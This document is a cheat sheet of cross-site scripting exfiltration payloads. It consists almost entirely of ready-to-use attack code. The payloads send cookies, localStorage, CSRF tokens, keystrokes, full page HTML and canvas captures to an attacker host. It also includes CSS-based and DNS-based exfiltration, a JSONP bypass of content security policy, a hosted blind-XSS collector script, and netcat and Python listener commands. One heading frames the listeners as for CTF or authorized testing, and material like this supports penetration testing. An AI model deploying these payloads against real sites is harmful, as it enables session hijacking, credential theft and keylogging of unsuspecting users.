# XSS Data Exfiltration Methods

## Cookie Exfiltration
```html
<script>fetch('https://attacker.com/log?c='+document.cookie)</script>
<script>new Image().src='https://attacker.com/log?c='+document.cookie</script>
<img src=x onerror="fetch('//attacker.com/log?c='+document.cookie)">
```

## When httpOnly Cookie Set (can't read via JS)
```html
<!-- Can't exfil cookie directly, but can perform actions as victim -->
<script>
fetch('/api/user/email', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/log?d='+JSON.stringify(d)))
</script>
```

## CSRF Token Exfiltration
```html
<script>
fetch('/account/settings')
  .then(r => r.text())
  .then(html => {
    var token = html.match(/csrf_token" value="([^"]+)"/)[1];
    fetch('https://attacker.com/log?token='+token);
  })
</script>
```

## LocalStorage/SessionStorage Exfiltration
```html
<script>fetch('https://attacker.com/log?ls='+encodeURIComponent(JSON.stringify(localStorage)))</script>
```

## Keylogger
```html
<script>
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log?k='+e.key);
});
</script>
```

## Full Page Content Exfiltration
```html
<script>fetch('https://attacker.com/log', {method:'POST', body: document.documentElement.outerHTML})</script>
```

## Screenshot-like Exfiltration (via canvas, limited)
```html
<script>
html2canvas(document.body).then(canvas => {
    fetch('https://attacker.com/log', {method:'POST', body: canvas.toDataURL()});
});
</script>
```

## Exfiltration Without JS Execution (CSS-based, for strict CSP)
```html
<style>
input[value^="a"] { background: url(https://attacker.com/log?c=a); }
input[value^="b"] { background: url(https://attacker.com/log?c=b); }
</style>
```

## Bypassing CSP with JSONP/Callback Endpoints
```html
<!-- If target site has a whitelisted domain with JSONP endpoint -->
<script src="https://whitelisted.com/api?callback=alert"></script>
```

## Exfil via DNS (for blind XSS, no HTTP allowed)
```html
<script>new Image().src='http://'+document.cookie.replace(/[^a-zA-Z0-9]/g,'')+'.attacker-dns-log.com'</script>
```

## Blind XSS Testing Payload (report-style)
```html
<script src="https://attacker.com/blindxss.js"></script>
```
```javascript
// blindxss.js hosted on attacker server
fetch('https://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify({
        url: location.href,
        cookie: document.cookie,
        html: document.documentElement.outerHTML
    })
});
```

## Listener/Collector Setup (for CTF/authorized testing)
```bash
# Simple netcat listener
nc -lvnp 8000

# Python HTTP server with logging
python3 -m http.server 8000

# webhook.site or requestbin for quick testing
```

## OOB Exfiltration Considerations
- Use HTTPS if target CSP blocks non-HTTPS connect-src
- Check CSP connect-src/img-src/script-src directives to pick working vector
- Base64/URL-encode data to avoid breaking URL structure
